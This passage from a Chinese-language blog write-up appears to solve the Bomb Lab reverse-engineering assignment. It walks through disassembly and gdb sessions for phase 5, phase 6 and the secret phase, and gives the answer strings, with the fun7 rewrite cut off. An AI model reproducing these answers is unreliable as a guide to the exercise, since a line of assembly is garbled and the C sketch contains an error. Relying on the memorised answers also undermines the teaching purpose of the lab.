&lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:   48 83 c4 20             add    $0x20,%rsp</span><br><span class="line">  4010f2:   5b                      pop    %rbx</span><br><span class="line">  4010f3:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>根据<code>jmp 40108b &lt;phase_5+0x29&gt;</code>，看出这段代码是循环。<code>%eax</code>初始为0， 每次循环将%eax加1，再和<code>6</code>进行比较(<code>0x4010a8</code>)。循环结束后调用<code>strings_not_equal</code>,将<code>0x40245e</code>处的字符串和<code>$rsp + 0x10</code>比较，两个字符串必须相等，否则爆炸。先查看<code>0x40245e</code>处的内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x40245e</span><br><span class="line">0x40245e:       &quot;flyers&quot;</span><br></pre></td></tr></table></figure>

<p>内容为<code>flyers</code>， 再看看<code>$rsp + 0x10</code>处的字符串是怎么来的：</p>
<p>从<code>0x401067: mov %rdi,%rbx</code>看出，我们输入的字符串位于<code>%rbx</code>。这里依次将<code>%rbx</code>的每一个字符先与<code>0xf</code>做与运算，然后加上<code>0x4024b0</code>得到新的地址<code>x</code>, 最后取地址<code>x</code>处的字符作为输出；循环结束后，输出一个长度为6的字符串，将以上逻辑改写为如下C代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">phase_5</span><span class="params">(<span class="type">char</span> str[<span class="number">6</span>])</span> &#123;	<span class="comment">// str表示用户输入的字符串</span></span><br><span class="line">	<span class="type">char</span> res[<span class="number">6</span>];</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; ++i) &#123;</span><br><span class="line">		res[i] = *(<span class="type">char</span> *)((str[i] &amp; <span class="number">0xf</span>) + <span class="number">0x4024b0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> !<span class="built_in">strcmp</span>(res[i], <span class="string">&quot;flyers&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因此，我们只需确定<code>0x4024b0</code>处的内容，然后对照ASCII码表，即可得到答案。</p>
<p>先查看<code>0x4024b0</code>， 只需查看前16个字符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/16c 0x4024b0</span><br><span class="line">0x4024b0 &lt;array.3449&gt;  : 109 &#x27;m&#x27; 97 &#x27;a&#x27;  100 &#x27;d&#x27; 117 &#x27;u&#x27; 105 &#x27;i&#x27; 101 &#x27;e&#x27; 114 &#x27;r&#x27; 115 &#x27;s&#x27;</span><br><span class="line">0x4024b8 &lt;array.3449+8&gt;: 110 &#x27;n&#x27; 102 &#x27;f&#x27; 111 &#x27;o&#x27; 116 &#x27;t&#x27; 118 &#x27;v&#x27; 98 &#x27;b&#x27;  121 &#x27;y&#x27; 108 &#x27;l&#x27;</span><br></pre></td></tr></table></figure>

<p>发现<code>flyers</code>中的每个字符都可以找到。根据偏移确定输入的每个字符的ASCII码最低一个字节依次为<code>0x9, 0xF, 0xE, 0x5, 0x6, 0x7</code>, 答案不唯一。对照ASCII码表 <a href="http://ascii.911cha.com/%EF%BC%8C">http://ascii.911cha.com/，</a> 我们找到一组解：<code>IONUVW</code></p>
<table>
<thead>
<tr>
<th>二进制</th>
<th>十进制</th>
<th>十六进制</th>
<th>图形</th>
</tr>
</thead>
<tbody><tr>
<td>0100 1001</td>
<td>73</td>
<td>49</td>
<td>I</td>
</tr>
<tr>
<td>0100 1111</td>
<td>79</td>
<td>4F</td>
<td>O</td>
</tr>
<tr>
<td>0100 1110</td>
<td>78</td>
<td>4E</td>
<td>N</td>
</tr>
<tr>
<td>0101 0101</td>
<td>85</td>
<td>55</td>
<td>U</td>
</tr>
<tr>
<td>0101 0110</td>
<td>86</td>
<td>56</td>
<td>V</td>
</tr>
<tr>
<td>0101 0111</td>
<td>87</td>
<td>57</td>
<td>W</td>
</tr>
</tbody></table>
<h3><span id="第六关">第六关</span></h3><p><code>phase_6</code>的代码如下，非常的长</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004010f4 &lt;phase_6&gt;:</span><br><span class="line">  4010f4:   41 56                   push   %r14</span><br><span class="line">  4010f6:   41 55                   push   %r13</span><br><span class="line">  4010f8:   41 54                   push   %r12</span><br><span class="line">  4010fa:   55                      push   %rbp</span><br><span class="line">  4010fb:   53                      push   %rbx</span><br><span class="line">  4010fc:   48 83 ec 50             sub    $0x50,%rsp</span><br><span class="line">  401100:   49 89 e5                mov    %rsp,%r13</span><br><span class="line">  401103:   48 89 e6                mov    %rsp,%rsi</span><br><span class="line">  401106:   e8 51 03 00 00          callq  40145c &lt;read_six_numbers&gt; #读6个数，保存到$rsp</span><br><span class="line"># 步骤1：判断输入的每个数是否不超过6，且任意两个数都不相等</span><br><span class="line">  40110b:   49 89 e6                mov    %rsp,%r14</span><br><span class="line">  40110e:   41 bc 00 00 00 00       mov    $0x0,%r12d			# %r12d = 0</span><br><span class="line">  401114:   4c 89 ed                mov    %r13,%rbp			# 初始$rbp, %r13都指向第一个数</span><br><span class="line">  401117:   41 8b 45 00             mov    0x0(%r13),%eax</span><br><span class="line">  40111b:   83 e8 01                sub    $0x1,%eax</span><br><span class="line">  40111e:   83 f8 05                cmp    $0x5,%eax			# 每个数必须小于等于6，否则爆炸</span><br><span class="line">  401121:   76 05                   jbe    401128 &lt;phase_6+0x34&gt;</span><br><span class="line">  401123:   e8 12 03 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401128:   41 83 c4 01             add    $0x1,%r12d			# %12d循环计数，每次加1</span><br><span class="line">  40112c:   41 83 fc 06             cmp    $0x6,%r12d			# 第一重循环，终止条件是%r12d等于6</span><br><span class="line">  401130:   74 21                   je     401153 &lt;phase_6+0x5f&gt;</span><br><span class="line">  401132:   44 89 e3                mov    %r12d,%ebx			# %ebx &lt;- %r12d</span><br><span class="line">  401135:   48 63 c3                movslq %ebx,%rax</span><br><span class="line">  401138:   8b 04 84                mov    (%rsp,%rax,4),%eax	# 将输入的下一个整数保存到%eax</span><br><span class="line">  40113b:   39 45 00                cmp    %eax,0x0(%rbp)		# 第二重循环，当前整数不能和它后面的任意一个数重复，否则爆炸； 两重循环用于确保输入的6个数没有重复数字，否则引爆炸弹</span><br><span class="line">  40113e:   75 05                   jne    401145 &lt;phase_6+0x51&gt;</span><br><span class="line">  401140:   e8 f5 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401145:   83 c3 01                add    $0x1,%ebx</span><br><span class="line">  401148:   83 fb 05                cmp    $0x5,%ebx</span><br><span class="line">  40114b:   7e e8                   jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">  40114d:   49 83 c5 04             add    $0x4,%r13</span><br><span class="line">  401151:   eb c1                   jmp    401114 &lt;phase_6+0x20&gt;</span><br><span class="line"># 步骤2：对于每个输入的整数，做这样的转换：用7减去这个整数的值替换原来的数</span><br><span class="line">  401153:   48 8d 74 24 18          lea    0x18(%rsp),%rsi</span><br><span class="line">  401158:   4c 89 f0                mov    %r14,%rax</span><br><span class="line">  40115b:   b9 07 00 00 00          mov    $0x7,%ecx 			# %ecx初值为7</span><br><span class="line">  401160:   89 ca                   mov    %ecx,%edx</span><br><span class="line">  401162:   2b 10                   sub    (%rax),%edx 			# %edx = 7 - (%rax), %rax指向当前整数</span><br><span class="line">  401164:   89 10                   mov    %edx,(%rax) 			# (%rax) = %edx</span><br><span class="line">  401166:   48 83 c0 04             add    $0x4,%rax   			# 循环每执行一次, %rax指向下一个整数</span><br><span class="line">  40116a:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line">  40116d:   75 f1                   jne    401160 &lt;phase_6+0x6c&gt;</span><br><span class="line"># 步骤3：0x6032d0处表示一个包含6个节点的链表， 对于经过步骤2之后转换的每个整数i, 取链表第i个节点的value，依次保存在(%rsp + 32)处</span><br><span class="line">  40116f:   be 00 00 00 00          mov    $0x0,%esi   # esi设为0</span><br><span class="line">  401174:   eb 21                   jmp    401197 &lt;phase_6+0xa3&gt;</span><br><span class="line">  401176:   48 8b 52 08             mov    0x8(%rdx),%rdx		# 访问链表</span><br><span class="line">  40117a:   83 c0 01                add    $0x1,%eax</span><br><span class="line">  40117d:   39 c8                   cmp    %ecx,%eax</span><br><span class="line">  40117f:   75 f5                   jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  401181:   eb 05                   jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">  401183:   ba d0 32 60 00          mov    $0x6032d0,%edx 		# 0x6032d0处为链表，包含6个节点</span><br><span class="line">  401188:   48 89 54 74 20          mov    %rdx,0x20(%rsp,%rsi,2) #每次取链表中第%ecx个节点的值，保存到$rsp + 0x20 + 2 * $rsi处， %ecx表示每个</span><br><span class="line">  40118d:   48 83 c6 04             add    $0x4,%rsi</span><br><span class="line">  401191:   48 83 fe 18             cmp    $0x18,%rsi</span><br><span class="line">  401195:   74 14                   je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">  401197:   8b 0c 34                mov    (%rsp,%rsi,1),%ecx	# ecx初始值为%rsp, 指向第一个数</span><br><span class="line">  40119a:   83 f9 01                cmp    $0x1,%ecx</span><br><span class="line">  40119d:   7e e4                   jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">  40119f:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4011a4:   ba d0 32 60 00          mov    $0x6032d0,%edx		# 0x6032d0处为链表，包含6个节点</span><br><span class="line">  4011a9:   eb cb                   jmp    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">  4011ab:   48 8b 5c 24 20          mov    0x20(%rsp),%rbx 		# 保存6个节点的值</span><br><span class="line">  4011b0:   48 8d 44 24 28          lea    0x28(%rsp),%rax</span><br><span class="line">  4011b5:   48 8d 74 24 50          lea    0x50(%rsp),%rsi</span><br><span class="line">  4011ba:   48 89 d9                mov    %rbx,%rcx</span><br><span class="line">  4011bd:   48 8b 10                mov    (%rax),%rdx</span><br><span class="line">  4011c0:   48 89 51 08             mov    %rdx,0x8(%rcx)</span><br><span class="line">  4011c4:   48 83 c0 08             add    $0x8,%rax</span><br><span class="line">  4011c8:   48 39 f0                cmp    %rsi,%rax</span><br><span class="line">  4011cb:   74 05                   je     4011d2 &lt;phase_6+0xde&gt;</span><br><span class="line">  4011cd:   48 89 d1                mov    %rdx,%rcx</span><br><span class="line">  4011d0:   eb eb                   jmp    4011bd &lt;phase_6+0xc9&gt;</span><br><span class="line"># 4.判断（%rsp + 32）处的6个整数是否为降序排列，如不满足条件引爆炸弹</span><br><span class="line">  4011d2:   48 c7 42 08 00 00 00    movq   $0x0,0x8(%rdx)</span><br><span class="line">  4011d9:   00</span><br><span class="line">  4011da:   bd 05 00 00 00          mov    $0x5,%ebp</span><br><span class="line">  4011df:   48 8b 43 08             mov    0x8(%rbx),%rax		#将链表下一个节点地址给rax</span><br><span class="line">  4011e3:   8b 00                   mov    (%rax),%eax			#eax为链表下一个节点的值</span><br><span class="line">  4011e5:   39 03                   cmp    %eax,(%rbx)			# 比较前后两个节点的值</span><br><span class="line">  4011e7:   7d 05                   jge    4011ee &lt;phase_6+0xfa&gt;#前一个数要大于后一个，否则炸弹爆炸。即必须为降序排列</span><br><span class="line">  4011e9:   e8 4c 02 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4011ee:   48 8b 5b 08             mov    0x8(%rbx),%rbx</span><br><span class="line">  4011f2:   83 ed 01                sub    $0x1,%ebp</span><br><span class="line">  4011f5:   75 e8                   jne    4011df &lt;phase_6+0xeb&gt;</span><br><span class="line">  4011f7:   48 83 c4 50             add    $0x50,%rsp</span><br><span class="line">  4011fb:   5b                      pop    %rbx</span><br><span class="line">  4011fc:   5d                      pop    %rbp</span><br><span class="line">  4011fd:   41 5c                   pop    %r12</span><br><span class="line">  4011ff:   41 5d                   pop    %r13</span><br><span class="line">  401201:   41 5e                   pop    %r14</span><br><span class="line">  401203:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>40111b ~ 40111e</code>： 将每个输入的整数和6比较，如存在某个数大于6，引爆炸弹。</p>
<p><code>40110b ~ 401153</code>： 双重循环，用于判断输入的6个数字中是否存在两个数相同。如果存在，引爆炸弹。</p>
<p>举例：用户可以输入<code>1,2,3,4,5,6</code>，记为<strong>序列0</strong>，满足以上两个条件。</p>
<p><code>401160 ~ 40116d</code>： 一重循环，对于<strong>序列0</strong>中的每个整数，做这样的转换：用<code>7</code>减去这个整数的结果替换原来的数，即得到<strong>序列1</strong>： <code>6,5,4,3,2,1</code>。</p>
<p>注意到<code>%edx</code>初值为<code>0x6032d0</code>， 打印这块内存，发现这是一条链表, 包含6个节点。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/24x 0x6032d0</span><br><span class="line">0x6032d0 &lt;node1&gt;:       0x0000014c      0x00000001      0x006032e0      0x00000000</span><br><span class="line">0x6032e0 &lt;node2&gt;:       0x000000a8      0x00000002      0x006032f0      0x00000000</span><br><span class="line">0x6032f0 &lt;node3&gt;:       0x0000039c      0x00000003      0x00603300      0x00000000</span><br><span class="line">0x603300 &lt;node4&gt;:       0x000002b3      0x00000004      0x00603310      0x00000000</span><br><span class="line">0x603310 &lt;node5&gt;:       0x000001dd      0x00000005      0x00603320      0x00000000</span><br><span class="line">0x603320 &lt;node6&gt;:       0x000001bb      0x00000006      0x00000000      0x00000000</span><br></pre></td></tr></table></figure>

<p><code>40116f ~ 4011d0</code>：遍历转换后的<strong>序列1</strong>，对于每个整数<code>i</code>, 取第<code>i</code>个<code>node</code>节点的值，依次存储到<code>%rsp + 32</code>处，本例中存储到<code>%rsp + 32</code>的6个数为<code>0x1bb</code>,<code>0x1dd</code>,<code>0x2b3</code>, <code>0x39c</code>, <code>0xa8</code>, <code>0x14c</code>,  记为<strong>序列2</strong>。</p>
<p><code>4011d2 ~ 4011f5</code>：判断<strong>序列2</strong>是否为降序排列，本例中的<strong>序列2</strong>不满足条件。因此我们需要回过头，调整输入的6个整数的顺序，使得序列2为降序排列，过程如下：</p>
<ul>
<li><p>链表中6个节点降序排列应为： <code>0x39c</code>,<code>0x2b3</code>,<code>0x1dd</code>,<code>0x1bb</code>,<code>0x14c</code>, <code>0xa8</code></p>
</li>
<li><p>对应的6个节点序列为：<code>node3</code>,<code>node4</code>,<code>node5</code>,<code>node6</code>,<code>node1</code>,<code>node2</code></p>
</li>
<li><p>推导出序列1: <code>3,4,5,6,1,2</code></p>
</li>
<li><p>根据序列1逆推出输入：<code>7-3, 7-4, 7-5, 7-6, 7-1, 7-2</code> -&gt; <code>4, 3, 5, 6, 1, 2</code></p>
</li>
</ul>
<p>最终得到这一关的答案为<code>4,3,5,6,1,2</code>， 唯一解。</p>
<h3><span id="隐藏关">隐藏关</span></h3><p>在汇编文件中搜<code>secret_phase</code>，发现<code>phase_defused</code>调用了它。先看看如何触发隐藏关，<code>phase_defused</code>代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004015c4 &lt;phase_defused&gt;:</span><br><span class="line">  4015c4:   48 83 ec 78             sub    $0x78,%rsp</span><br><span class="line">  4015c8:   64 48 8b 04 25 28 00    mov    %fs:0x28,%rax</span><br><span class="line">  4015cf:   00 00</span><br><span class="line">  4015d1:   48 89 44 24 68          mov    %rax,0x68(%rsp)</span><br><span class="line">  4015d6:   31 c0                   xor    %eax,%eax</span><br><span class="line">  4015d8:   83 3d 81 21 20 00 06    cmpl   $0x6,0x202181(%rip)        # 603760 &lt;num_input_strings&gt;	仅当第6关通过后，不进行跳转，进入隐藏关</span><br><span class="line">  4015df:   75 5e                   jne    40163f &lt;phase_defused+0x7b&gt;</span><br><span class="line">  4015e1:   4c 8d 44 24 10          lea    0x10(%rsp),%r8</span><br><span class="line">  4015e6:   48 8d 4c 24 0c          lea    0xc(%rsp),%rcx</span><br><span class="line">  4015eb:   48 8d 54 24 08          lea    0x8(%rsp),%rdx</span><br><span class="line">  4015f0:   be 19 26 40 00          mov    $0x402619,%esi	# 格式为&quot;%d %d %s&quot;</span><br><span class="line">  4015f5:   bf 70 38 60 00          mov    $0x603870,%edi	# 0x603870处保存第四关输入的答案， 可通过对phase_defused打断点，或者对0x603870打数据断点确认</span><br><span class="line">  4015fa:   e8 f1 f5 ff ff          callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  4015ff:   83 f8 03                cmp    $0x3,%eax					# 需要输入3个参数，才能触发隐藏关，否则跳转0x401635</span><br><span class="line">  401602:   75 31                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401604:   be 22 26 40 00          mov    $0x402622,%esi	# %esi处字符串&quot;DrEvil&quot;</span><br><span class="line">  401609:   48 8d 7c 24 10          lea    0xls</span><br><span class="line">  40160e:   e8 25 fd ff ff          callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  401613:   85 c0                   test   %eax,%eax</span><br><span class="line">  401615:   75 1e                   jne    401635 &lt;phase_defused+0x71&gt;</span><br><span class="line">  401617:   bf f8 24 40 00          mov    $0x4024f8,%edi</span><br><span class="line">  40161c:   e8 ef f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401621:   bf 20 25 40 00          mov    $0x402520,%edi</span><br><span class="line">  401626:   e8 e5 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40162b:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401630:   e8 0d fc ff ff          callq  401242 &lt;secret_phase&gt;</span><br><span class="line">  401635:   bf 58 25 40 00          mov    $0x402558,%edi</span><br><span class="line">  40163a:   e8 d1 f4 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40163f:   48 8b 44 24 68          mov    0x68(%rsp),%rax</span><br><span class="line">  401644:   64 48 33 04 25 28 00    xor    %fs:0x28,%rax</span><br><span class="line">  40164b:   00 00</span><br><span class="line">  40164d:   74 05                   je     401654 &lt;phase_defused+0x90&gt;</span><br><span class="line">  40164f:   e8 dc f4 ff ff          callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  401654:   48 83 c4 78             add    $0x78,%rsp</span><br><span class="line">  401658:   c3                      retq</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>首先查看<code>4015ff: cmp $0x3,%eax</code>， 说明<code>sscanf</code>需接受3个变参才能触发隐藏关。参数格式依次为<code>%d, %d, %s</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x402619</span><br><span class="line">0x402619:       &quot;%d %d %s&quot;</span><br></pre></td></tr></table></figure>

<p>接下来确定<code>0x603870</code>处字符串怎么来的。在<code>0x603870</code>处设置gdb数据断点, 发现<code>0x603870</code>处内容依次变为<code>7</code>, <code>7 0</code>，然后程序退出。而<code>7 0</code>恰好是我们第四关输入的答案。 说明我们只需在第四关后添加一个合适的字符串，作为第3个参数，即可触发隐藏关。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) watch *0x603870							# 设置内存断点</span><br><span class="line">Hardware watchpoint 5: *0x603870</span><br><span class="line">(gdb) r</span><br><span class="line">...</span><br><span class="line">Hardware watchpoint 5: *0x603870</span><br><span class="line">Old value = 0</span><br><span class="line">New value = 55</span><br><span class="line">0x00007ffff7aa1b53 in __memcpy_sse2 () from /lib64/libc.so.6</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;7&quot;</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Hardware watchpoint 5: *0x603870</span><br><span class="line">Old value = 55</span><br><span class="line">New value = 3153975</span><br><span class="line">0x00007ffff7aa1b64 in __memcpy_sse2 () from /lib64/libc.so.6</span><br><span class="line">(gdb) x/s 0x603870</span><br><span class="line">0x603870 &lt;input_strings+240&gt;:   &quot;7 0&quot;</span><br></pre></td></tr></table></figure>

<p>根据<code>401604: mov $0x402622,%esi</code>， 确认输入的字符串为<code>&quot;DrEvil&quot;</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/s 0x402622</span><br><span class="line">0x402622:       &quot;DrEvil&quot;</span><br></pre></td></tr></table></figure>

<p>因此，只需要将第四关答案改为<code>7 0 DrEvil</code>， 即可触发隐藏关。</p>
<h4><span id="查看隐藏关代码">查看隐藏关代码</span></h4><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">0000000000401242 &lt;secret_phase&gt;:</span><br><span class="line">  401242:   53                      push   %rbx</span><br><span class="line">  401243:   e8 56 02 00 00          callq  40149e &lt;read_line&gt;</span><br><span class="line">  401248:   ba 0a 00 00 00          mov    $0xa,%edx		# strtol的第三个参数，base等于10</span><br><span class="line">  40124d:   be 00 00 00 00          mov    $0x0,%esi		# strtol的第二个参数, endptr=&#x27;\0&#x27;</span><br><span class="line">  401252:   48 89 c7                mov    %rax,%rdi		# strtol的第一个参数，str=用户输入字符串</span><br><span class="line">  401255:   e8 76 f9 ff ff          callq  400bd0 &lt;strtol@plt&gt;</span><br><span class="line">  40125a:   48 89 c3                mov    %rax,%rbx		# 将用户输入的整数保存到%rbx</span><br><span class="line">  40125d:   8d 40 ff                lea    -0x1(%rax),%eax 	# %eax = %rax - 1</span><br><span class="line">  401260:   3d e8 03 00 00          cmp    $0x3e8,%eax		# 0x3e8 = 1000</span><br><span class="line">  401265:   76 05                   jbe    40126c &lt;secret_phase+0x2a&gt;</span><br><span class="line">  401267:   e8 ce 01 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40126c:   89 de                   mov    %ebx,%esi	 	# fun7的第二个参数, %rbx</span><br><span class="line">  40126e:   bf f0 30 60 00          mov    $0x6030f0,%edi	# fun7</span><br><span class="line">  401273:   e8 8c ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  401278:   83 f8 02                cmp    $0x2,%eax		# fun7的返回值必须为2，否则引爆</span><br><span class="line">  40127b:   74 05                   je     401282 &lt;secret_phase+0x40&gt;</span><br><span class="line">  40127d:   e8 b8 01 00 00          callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  401282:   bf 38 24 40 00          mov    $0x402438,%edi</span><br><span class="line">  401287:   e8 84 f8 ff ff          callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  40128c:   e8 33 03 00 00          callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  401291:   5b                      pop    %rbx</span><br></pre></td></tr></table></figure>

<p><code>0x401255</code>处调用了strtol函数，函数声明如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">int</span> <span class="title function_">strtol</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">char</span> **endptr, <span class="type">int</span> base)</span>;</span><br></pre></td></tr></table></figure>

<p>查看<code>0x401248 ~ 0x401267</code>，发现最后一关需要输入一个整数，并且该整数不能超过1001。</p>
<p>查看<code>0x40126c ~ 0x40127b</code>， 发现调用了<code>fun7</code>函数，且该函数返回值必须为2。<code>fun7</code>接受两个入参。</p>
<p>打印<code>fun7</code>的第一个参数, 发现这是一棵二叉树。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) x/120x 0x6030f0</span><br><span class="line">0x6030f0 &lt;n1&gt;:  0x00000024      0x00000000      0x00603110      0x00000000</span><br><span class="line">0x603100 &lt;n1+16&gt;:       0x00603130      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603110 &lt;n21&gt;: 0x00000008      0x00000000      0x00603190      0x00000000</span><br><span class="line">0x603120 &lt;n21+16&gt;:      0x00603150      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603130 &lt;n22&gt;: 0x00000032      0x00000000      0x00603170      0x00000000</span><br><span class="line">0x603140 &lt;n22+16&gt;:      0x006031b0      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603150 &lt;n32&gt;: 0x00000016      0x00000000      0x00603270      0x00000000</span><br><span class="line">0x603160 &lt;n32+16&gt;:      0x00603230      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603170 &lt;n33&gt;: 0x0000002d      0x00000000      0x006031d0      0x00000000</span><br><span class="line">0x603180 &lt;n33+16&gt;:      0x00603290      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603190 &lt;n31&gt;: 0x00000006      0x00000000      0x006031f0      0x00000000</span><br><span class="line">0x6031a0 &lt;n31+16&gt;:      0x00603250      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6031b0 &lt;n34&gt;: 0x0000006b      0x00000000      0x00603210      0x00000000</span><br><span class="line">0x6031c0 &lt;n34+16&gt;:      0x006032b0      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6031d0 &lt;n45&gt;: 0x00000028      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6031e0 &lt;n45+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6031f0 &lt;n41&gt;: 0x00000001      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603200 &lt;n41+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603210 &lt;n47&gt;: 0x00000063      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603220 &lt;n47+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603230 &lt;n44&gt;: 0x00000023      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603240 &lt;n44+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603250 &lt;n42&gt;: 0x00000007      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603260 &lt;n42+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603270 &lt;n43&gt;: 0x00000014      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603280 &lt;n43+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x603290 &lt;n46&gt;: 0x0000002f      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6032a0 &lt;n46+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6032b0 &lt;n48&gt;: 0x000003e9      0x00000000      0x00000000      0x00000000</span><br><span class="line">0x6032c0 &lt;n48+16&gt;:      0x00000000      0x00000000      0x00000000      0x00000000</span><br></pre></td></tr></table></figure>

<p>把这棵二叉树画出来, 发现有4层，共15个节点：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">                                        0x24</span><br><span class="line">                              /                       \</span><br><span class="line">                 0x8                                            0x32</span><br><span class="line">            /           \                                   /           \</span><br><span class="line">      0x6                   0x16                    0x2d                    0x6b</span><br><span class="line">    /    \                 /     \                 /     \                 /     \</span><br><span class="line">0x1        0x7        0x14        0x23        0x28        0x2f        0x63        0x3e9</span><br></pre></td></tr></table></figure>

<p><code>fun7</code>代码如下，可以看出这是个递归函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401204 &lt;fun7&gt;:</span><br><span class="line">  401204:   48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  401208:   48 85 ff                test   %rdi,%rdi</span><br><span class="line">  40120b:   74 2b                   je     401238 &lt;fun7+0x34&gt;</span><br><span class="line">  40120d:   8b 17                   mov    (%rdi),%edx		# 首次调用fun7时， rdi指向二叉树的根节点</span><br><span class="line">  40120f:   39 f2                   cmp    %esi,%edx		# 如当前节点值小于等于用户输入的数，跳转到0x401220</span><br><span class="line">  401211:   7e 0d                   jle    401220 &lt;fun7+0x1c&gt;</span><br><span class="line">  401213:   48 8b 7f 08             mov    0x8(%rdi),%rdi	# 取当前节点的左子女</span><br><span class="line">  401217:   e8 e8 ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  40121c:   01 c0                   add    %eax,%eax</span><br><span class="line">  40121e:   eb 1d                   jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401220:   b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  401225:   39 f2                   cmp    %esi,%edx</span><br><span class="line">  401227:   74 14                   je     40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401229:   48 8b 7f 10             mov    0x10(%rdi),%rdi	# 取当前节点的右子女</span><br><span class="line">  40122d:   e8 d2 ff ff ff          callq  401204 &lt;fun7&gt;</span><br><span class="line">  401232:   8d 44 00 01             lea    0x1(%rax,%rax,1),%eax # %eax = 2 * $rax + 1</span><br><span class="line">  401236:   eb 05                   jmp    40123d &lt;fun7+0x39&gt;</span><br><span class="line">  401238:   b8 ff ff ff ff          mov    $0xffffffff,%eax	# 当前节点为NULL，返回-1</span><br><span class="line">  40123d:   48 83 c4 08             add    $0x8,%rsp</span><br><span class="line">  401241:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>将递归逻辑转换为C语言， 如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 二叉树的数组表示，树高4层, 共15个节点</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> arrTree[] = &#123; <span class="number">0x24</span>,</span><br><span class="line">                        <span class="number">0x8</span>, <span class="number">0x32</span>,</span><br><span class="line">                        <span class="number">0x6</span>, <span class="number">0x16</span>, <span class="number">0x2d</span>, <span class="number">0x6b</span>,</span><br><span class="line">                        <span class="number">0x1</span>, <span class="number">0x7</span> , <span class="number">0x14</span>, <span class="number">0x23</span>, <span class="number">0x28</span>, <span class="number">0x2f</span>, <span class="number">0x63</span>, <span class="number">0x3e9</span> &#125;;</span><br><span class="line"><span class="comment">// 